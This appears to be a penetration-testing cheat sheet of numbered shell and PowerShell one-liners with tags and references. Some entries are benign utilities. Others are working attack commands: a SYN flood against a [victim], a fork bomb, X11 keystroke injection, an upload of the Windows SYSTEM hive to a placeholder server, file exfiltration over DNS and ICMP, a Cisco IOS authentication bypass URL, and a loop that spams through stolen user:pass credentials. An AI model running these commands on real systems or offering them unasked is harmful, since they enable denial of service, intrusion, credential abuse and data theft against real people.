### 1. Display system clock in terminal top right corner! :-)
```
while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
```
**- linux,bash,loop,interesting**
#### References:

http://www.computerhope.com/unix/utput.htm
__________
### 2. Syn flood victim
```
hping3 -S [victim] -a [gw] -p [port] --flood
```
**- linux,bash,networking,interesting**
#### References:

http://wiki.hping.org/
__________
### 3. recover file after being deleted
```
lsof 2>/dev/null | grep deleted;  cat /proc/24702/fd/4
```
**- linux,bash,interesting**
#### References:

https://www.cyberciti.biz/tips/linux-ext3-ext4-deleted-files-recovery-howto.html
__________
### 4. Fix nano <3 ;)
```
# rm -rf `which nano`; ln -s `which vim` /usr/bin/nano
```
**- bash,text manipulation,files,interesting**
#### References:

https://xkcd.com/378/
__________
### 5. not ls
```
sl
```
**- linux,bash,interesting**
#### References:

https://www.cyberciti.biz/tips/displays-animations-when-accidentally-you-type-sl-instead-of-ls.html
__________
### 6. Abuse open x11 : Think open term add user add key ;)
```
command="[cmd]";echo -n xdotool key " "; echo -n $command| sed  's# #€#g' | sed -e 's/\(.\)/\1 /g' | sed 's#/#slash#g' | sed 's#@#at#g'|  sed 's#€#space#g' | sed 's#-#minus#g'|sed 's#>#greater#g'| sed 's#+#plus#g' | sed 's#"#quotedbl#g' | sed 's#~#asciitilde#g' | sed 's#\.#period#g' | sed 's#_#underscore#g'; echo KP_Enter
```
**- linux,bash,interesting**
#### References:

https://necurity.co.uk
https://ubuntuforums.org/archive/index.php/t-1970619.html
__________
### 7. Burpify JSON request
```
cat json.txt | sed "s/false/§false§/g" | sed "s/true/§true§/g" | sed "s/null/§null§/g" | sed "s/:\"/:\"§/g" | sed "s/\",/§\",/g" | sed "s/\"}/§\"}/g" | sed "s/\\[\\]/\\[§§\\]/g"
```
**- bash,text manipulation,interesting,web application**
#### References:

https://www.yg.ht/
__________
### 8. turn loop for local admins into csv
```
egrep -v "(\*\] T|\[\*\] F|[\*\] C|[\*\] U|[\*\] S|[\*\] R)" local_admin_information | egrep -v "(\[\*\] P|\[\*\] R|\[\*\] S|\[\*\] O|\[\*\] U)" | grep -v "Alias name" | grep -v "Administrators have complete" | grep -v \[\!\] | grep -v \[-\] | dos2unix | grep -v "^$" | sed s/"\[\*\] Creating service.*on"/''/g | grep -v Members | sed s/\\.\\.\\.\\.\\./','/g | sed s/"^ "/"€"/g | sed s/'The command completed successfully.'/€/g | tr "\n" "," | tr € "\n" | grep -v "^$" | sort | uniq  > local_admins.csv
```
**- linux,bash,text manipulation,loop,user information,interesting**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 9. instant web server
```
python -m SimpleHTTPServer [PORT]
```
**- pivoting,interesting,python,av evasion**
#### References:

https://docs.python.org/2/library/simplehttpserver.html
__________
### 10. Fork Bomb : CRASH SYSTEM
```
:(){:|:&;:
```
**- linux,interesting**
#### References:

https://www.cyberciti.biz/faq/understanding-bash-fork-bomb/
__________
### 11. Spawn a cmd in a gui window
```
xterm -bg black -title "TryH4rD3r" -e "ls -la;read"
```
**- linux,bash,interesting**
#### References:

http://invisible-island.net/xterm/
__________
### 12. uninstall patch : 2871997
```
wusa.exe /uninstall /kb: [id]
```
**- interesting,Windows**
#### References:

https://support.microsoft.com/en-gb/help/934307/description-of-the-windows-update-standalone-installer-in-windows
__________
### 13. lock the workstation
```
rundll32.dll user32.dll LockWorkstation
```
**- interesting,Windows**
#### References:

https://technet.microsoft.com/en-us/library/ee649171(v=ws.11).aspx
__________
### 14. list of drives : cd Env:\ . . . mind . . . blown
```
get-psdrive
```
**- enumeration,interesting,Windows,configuration,powershell**
#### References:

https://msdn.microsoft.com/en-us/powershell/reference/5.0/microsoft.powershell.management/get-psdrive
__________
### 15. powershell port scanning
```
$ports=([ports]);$ip=[ip];foreach ($port in $ports){try{$socket=New-Object System.Net.Sockets.TCPClient($ip,$port);}catch{}; if $socket -eq $NULL {echo $ip ": "$port" : Closed";}else{echo $ip ": "$port" : Open";}$socket = $NULL;}}
```
**- networking,loop,interesting,scanning,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 16. Powershell send an email
```
powershell.exe Send-MailMessage -to "[victim]" -from "[from]" -subject "[subject]" -a "[Attach file path]" -body "[Body]" -SmtpServer [ServerIP]
```
**- interesting,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 17. Powershell upload file VIA post, script must write this out
```
powershell.exe -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback{$true}$server="[$ip]/[script]";$filepath="c:/temp/SYSTEM";$http = new-object System.Net.Webclient; $response = $http.uploadFile($server,$filepath);"
```
**- networking,files,interesting,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 18. see /etc/services
```
common ports
```
**- linux,networking,interesting**
#### References:

https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers
__________
### 19. Networking Time to Live
```
TTL: 128 = Windows | 64 = linux | 255 = generic OR solaris
```
**- networking,interesting**
#### References:

https://www.howtogeek.com/104337/hacker-geek-os-fingerprinting-with-ttl-and-tcp-window-sizes/
__________
### 20. Networking Time to Live
```
Window Size: 5840 = Linux | 5720 = Google Nix | 65535 = XP or BSD | 8192 = Visa and above | 4128 = Cisco Router
```
**- networking,interesting,reference**
#### References:

https://www.howtogeek.com/104337/hacker-geek-os-fingerprinting-with-ttl-and-tcp-window-sizes/
__________
### 21. Classfull networks have not existed since 1993 cisco GTFO with telling people they exist
```
Class Ip ranges : Go away, there was A,B,C,D,E. WAS AS IN NOT ANY MORE!
```
**- networking,interesting**
#### References:

https://en.wikipedia.org/wiki/Classful_network
__________
### 22. Bypass auth on ios 11.2-12.2
```
http://[ip]/level/56/exec/show/config
```
**- cisco,interesting,web application,remote command shell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 23. uninteractive FTP, read commands from file
```
ftp -s ftp.txt
```
**- files,interesting,Windows**
#### References:

https://technet.microsoft.com/en-gb/library/bb490910.aspx
__________
### 24. exfil file through DNS, may want to encrypt, also assuming you have a short domain
```
for line in `base64 -w 62 [file]`; do host $line.[hostname]; done
```
**- linux,bash,loop,interesting**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 25. Exfil over icmp
```
ping -p 11010101010101010101010101010199 -c 1 -M do 127.0.0.1 -s 32; for line in `base64 sslfile.key | xxd -p -c 14`; do line2=`echo "11 $line 99" |tr -d ' '`; ping -p $line2 -c 1 -M do 127.0.0.1 -s 32; done; ping -p 11101010101010101010101010101099 -c 1 -M do 127.0.0.1 -s 32
```
**- linux,networking,loop,interesting**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 26. tcp port scanning from bash, just wireshark on the ip, useful if you have cmd execution on web app
```
for i in {1..65000}; do echo 1 > /dev/tcp/[ip]/$i; echo $i; done
```
**- linux,bash,networking,loop,interesting,scanning**
#### References:

http://tldp.org/LDP/abs/html/devref1.html
__________
### 27. generate user list from PDF's, you can get more info to such as pdf maker
```
for i in *; do pdfinfo $i | egrep -i "Auth"; done  | sort
```
**- loop,enumeration,user information,interesting,recon**
#### References:

http://linuxcommand.org/man_pages/pdfinfo1.html
__________
### 28. Loop around 'dets' (user:pass) and send an email through an authenticated mailserver with an attached file whos contents is stored in 'email'
```
for i in `cat dets`; do echo "Sening Spam from $i"; mailx -s "Report Attached" -r "`echo $i | awk -F @ '{print $1}'`<`echo $i | awk -F : '{print $1}'`>" -a report.pdf -S smtp-auth=login -S smtp-auth-user="`echo $i | awk -F : '{print $1}'`" -S smtp-auth-password="` echo $i | awk -F : '{print $2}'`" -S ssl-verify=ignore -v -S smtp="10.11.1.229" [victim] < email;echo _________; done
```
**- networking,loop,interesting**
#### References:

http://www.binarytides.com/linux-mailx-command/
__________
### 29. Common operations on data
```
https://gchq.github.io/CyberChef/
```
**- interesting,reference,web address**
#### References:

https://gchq.github.io/CyberChef/
__________
### 30. search the manual page names and descriptions
```
apropos [keyword]
```
**- linux,interesting**
#### References:

http://www.thegeekstuff.com/2009/11/5-methods-to-get-quick-help-on-linux-commands/
__________
### 31. PHP simple server
```
php -S 0.0.0.0:80
```
**- pivoting,interesting**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
__________
### 32. GitUp : Update all the opt gits
```
for i in $(ls -alh /data/shares/opt/ | grep "^drw" | awk '{print $9}'); do cd /data/shares/opt/$i; git pull; echo $i;done | grep -v fatal
```
**- linux,interesting,GIT**
#### References:

https://yg.ht
__________
### 33. Most used Terminal commands
```
history | awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head
```
**- linux,bash,interesting**
#### References:

http://www.commandlinefu.com/commands/view/350/output-your-microphone-to-a-remote-computers-speaker
__________
### 34. Project your mic to remote hosts speakers
```
dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp
```
**- linux,bash,interesting**
#### References:

http://www.commandlinefu.com/commands/view/350/output-your-microphone-to-a-remote-computers-speaker
__________
